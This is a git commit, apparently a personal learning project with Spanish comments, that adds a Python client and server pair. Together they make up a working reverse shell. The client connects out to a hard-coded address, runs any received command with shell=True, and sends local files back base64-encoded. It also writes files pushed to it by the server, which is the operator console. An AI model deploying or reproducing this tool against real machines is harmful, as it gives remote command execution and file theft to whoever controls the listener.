c0272838b2ae4726c24f8146e27931ab3ef3e933
Camilo <camilo.verav@sansano.usm.cl>
2021-10-20 14:19:00 -0300

    primer commit

---
+++ cliente.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python3
+# _*_ coding: utf8 _*_
+
+import socket
+import os
+import subprocess
+import base64
+
+
+def shell():
+    directorio = os.getcwd()
+    cliente.send(directorio.encode())
+    while True:
+        res = cliente.recv(2048)
+        if res.decode() == "exit":
+            break
+        elif res.decode()[:2] == "cd" and len(res) > 2:
+            os.chdir(res[3:])
+            result = os.getcwd()
+            cliente.send(result.encode())
+        elif res.decode()[:9] == "descargar":
+            with open(res.decode()[10:], 'rb') as arch:
+                cliente.send(base64.b64encode(arch.read()))
+        elif res.decode()[:5] == "subir":
+            with open(res.decode()[6:], 'wb') as arch:
+                datos = cliente.recv(30000)
+                arch.write(base64.b64decode(datos.decode()))
+        else:
+            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read()
+            if len(result) == 0:
+                cliente.send("1".encode())
+            else:
+                cliente.send(result)
+
+
+cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Usar IPv4 y TCP
+cliente.connect(("192.168.0.19", 1608))
+shell()
+cliente.close()
---
+++ servidor.py
@@ -0,0 +1,58 @@
+#!/usr/bin/env python3
+# _*_ coding: utf8 _*_
+
+import socket
+import base64
+
+
+def sv():
+    global servidor
+    global ip
+    global target
+    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Configura el servidor para IPv4 y TCP
+    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Configura servidor para usar únicamente socket y que se pueda reusar la dirección
+    servidor.bind(("192.168.0.19", 1608))  # IP (cambiar) y puerto (Mi cumple XD)
+    servidor.listen(1)  # Acepta una única conexión
+    print("Servidor andando y esperando conexiones...")
+    target, ip = servidor.accept()
+    print("Recibida conexión desde: "+str(ip[0]))
+
+
+def shell():
+    directorio = target.recv(2048)  # Recibe los bytes del directorio
+    while True:
+        comando = input(directorio.decode()+"~$: ")  # Printea el directorio formateado y pasado a string
+        if comando == "exit":
+            break
+        elif comando[:2] == "cd":  # Caso especial pk se chingaba con el cd, haciendo que cambie de directorio por python
+            target.send(comando.encode())
+            res = target.recv(2048)
+            directorio = res
+            print(res.decode())
+        elif comando == "":  # Para que no se chingue con un enter
+            pass
+        elif comando[:5] == "subir":
+            try:
+                target.send(comando.encode())
+                with open(comando[6:], 'rb') as arch:
+                    target.send(base64.b64encode(arch.read()))
+            except:
+                print("Ocurrió un error en la subida de '"+res.decode()+"'")
+        elif comando[:9] == "descargar":
+            target.send(comando.encode())
+            with open(comando[10:], 'wb') as arch:
+                datos = target.recv(30000)
+                print(datos.decode())
+                arch.write(base64.b64decode(datos.decode()))
+        else:
+            target.send(comando.encode())
+            res = target.recv(2048)
+            if res == "1":
+                continue
+            else:
+                print(res.decode())
+
+
+sv()
+shell()
+servidor.close()
